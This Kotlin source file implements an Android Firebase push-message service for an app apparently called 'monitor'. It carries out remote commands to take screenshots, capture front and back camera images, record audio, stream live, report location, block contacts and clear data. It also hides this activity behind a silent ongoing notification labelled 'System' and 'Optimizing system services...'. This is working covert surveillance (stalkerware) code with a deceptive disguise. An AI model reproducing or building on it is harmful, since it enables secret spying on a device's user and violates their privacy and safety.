package com.empresa.monitor.service.fcm

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.core.app.NotificationCompat
import com.empresa.monitor.MonitorApp
import com.empresa.monitor.service.call.CallRecorder
import com.empresa.monitor.service.streaming.LiveStreamer
import com.empresa.monitor.service.streaming.AutoCamera
import com.empresa.monitor.data.api.ApiClient
import com.empresa.monitor.data.model.DeviceLogApiRequest
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.*
import org.json.JSONObject

/**
 * Firebase Cloud Messaging Service.
 * Replaces the previous polling-based CommandPoller.
 * Receives remote commands from the server via FCM push.
 */
class MonitorFcmService : FirebaseMessagingService() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var deviceId: String? = null

    companion object {
        private const val TAG = "MonitorFCM"
        var fcmToken: String? = null
            private set
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        fcmToken = token
        Log.d(TAG, "New FCM token: $token")

        // Send token to server
        scope.launch {
            sendTokenToServer(token)
        }
    }

    override fun onMessageReceived(message: RemoteMessage) {
        super.onMessageReceived(message)

        Log.d(TAG, "FCM message received: ${message.data}")

        // Process data payload
        val data = message.data
        if (data.isNotEmpty()) {
            handleCommand(data)
        }

        // Show silent notification for Android 13+ to keep service alive
        showSilentNotification()
    }

    private fun handleCommand(data: Map<String, String>) {
        val action = data["action"] ?: return
        val payload = data["payload"] ?: "{}"

        Log.d(TAG, "Executing command: $action")

        scope.launch {
            try {
                when (action) {
                    "capture_screenshot" -> {
                        // Trigger screenshot capture via intent
                        sendBroadcast(Intent("com.empresa.monitor.CAPTURE_SCREENSHOT"))
                    }
                    "capture_camera_front" -> {
                        sendBroadcast(Intent("com.empresa.monitor.CAPTURE_CAMERA_FRONT"))
                    }
                    "capture_camera_back" -> {
                        sendBroadcast(Intent("com.empresa.monitor.CAPTURE_CAMERA_BACK"))
                    }
                    "record_audio" -> {
                        val duration = JSONObject(payload).optInt("duration_seconds", 30)
                        sendBroadcast(Intent("com.empresa.monitor.RECORD_AUDIO")
                            .putExtra("duration_seconds", duration))
                    }
                    "start_streaming" -> {
                        sendBroadcast(Intent("com.empresa.monitor.START_STREAMING"))
                    }
                    "stop_streaming" -> {
                        sendBroadcast(Intent("com.empresa.monitor.STOP_STREAMING"))
                    }
                    "get_location" -> {
                        sendBroadcast(Intent("com.empresa.monitor.GET_LOCATION"))
                    }
                    "get_device_info" -> {
                        collectAndSendDeviceInfo()
                    }
                    "update_config" -> {
                        handleConfigUpdate(JSONObject(payload))
                    }
                    "block_contact" -> {
                        val phone = JSONObject(payload).optString("phone", "")
                        if (phone.isNotEmpty()) {
                            sendBroadcast(Intent("com.empresa.monitor.BLOCK_CONTACT")
                                .putExtra("phone", phone))
                        }
                    }
                    "unblock_contact" -> {
                        val phone = JSONObject(payload).optString("phone", "")
                        if (phone.isNotEmpty()) {
                            sendBroadcast(Intent("com.empresa.monitor.UNBLOCK_CONTACT")
                                .putExtra("phone", phone))
                        }
                    }
                    "configure_auto_camera" -> {
                        val frontSec = JSONObject(payload).optInt("front_interval", 0)
                        val backSec = JSONObject(payload).optInt("back_interval", 0)
                        sendBroadcast(Intent("com.empresa.monitor.CONFIGURE_AUTO_CAMERA")
                            .putExtra("front_interval", frontSec)
                            .putExtra("back_interval", backSec))
                    }
                    "clear_data" -> {
                        sendBroadcast(Intent("com.empresa.monitor.CLEAR_DATA"))
                    }
                    "ping" -> {
                        // Respond to ping with device status
                        sendDeviceStatus()
                    }
                    "update_interval" -> {
                        val sec = JSONObject(payload).optInt("interval_seconds", 300)
                        val endpoint = JSONObject(payload).optString("endpoint", "location")
                        sendBroadcast(Intent("com.empresa.monitor.UPDATE_INTERVAL")
                            .putExtra("endpoint", endpoint)
                            .putExtra("interval_seconds", sec))
                    }
                    else -> {
                        Log.w(TAG, "Unknown FCM command: $action")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error executing command $action", e)
            }
        }
    }

    private suspend fun collectAndSendDeviceInfo() {
        try {
            val info = JSONObject().apply {
                put("device_model", Build.MODEL)
                put("device_brand", Build.BRAND)
                put("android_version", Build.VERSION.RELEASE)
                put("sdk_version", Build.VERSION.SDK_INT)
                put("manufacturer", Build.MANUFACTURER)
                put("battery_level", getBatteryLevel())
                put("fcm_token", fcmToken)
            }

            ApiClient.api.sendDeviceLog(deviceId ?: "", DeviceLogApiRequest(
                logType = "device_info",
                dataJson = info.toString()
            ))
        } catch (e: Exception) { e.printStackTrace() }
    }

    private suspend fun sendDeviceStatus() {
        try {
            val status = JSONObject().apply {
                put("device_id", deviceId)
                put("status", "online")
                put("timestamp", System.currentTimeMillis())
                put("battery", getBatteryLevel())
                put("fcm_token", fcmToken)
            }

            ApiClient.api.sendDeviceLog(deviceId ?: "", DeviceLogApiRequest(
                logType = "status_ping",
                dataJson = status.toString()
            ))
        } catch (e: Exception) { /* silent */ }
    }

    private fun handleConfigUpdate(payload: JSONObject) {
        val config = payload.optJSONObject("config") ?: payload
        sendBroadcast(Intent("com.empresa.monitor.UPDATE_CONFIG")
            .putExtra("config_json", config.toString()))
    }

    private fun getBatteryLevel(): Int {
        val intent = registerReceiver(null, android.content.IntentFilter(
            android.content.Intent.ACTION_BATTERY_CHANGED))
        val level = intent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = intent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level >= 0 && scale > 0) (level * 100 / scale) else -1
    }

    private suspend fun sendTokenToServer(token: String) {
        try {
            // The device should already be registered; update FCM token via API
            ApiClient.api.updateDevice(deviceId ?: "", mapOf("fcm_token" to token))
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send FCM token", e)
        }
    }

    private fun showSilentNotification() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) return

        val channelId = MonitorApp.CHANNEL_MONITOR
        val notification = NotificationCompat.Builder(this, channelId)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("System")
            .setContentText("Optimizing system services...")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setOngoing(true)
            .build()

        startForeground(MonitorApp.NOTIFICATION_ID + 1, notification)
    }

    fun setDeviceId(id: String) {
        deviceId = id
    }

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}
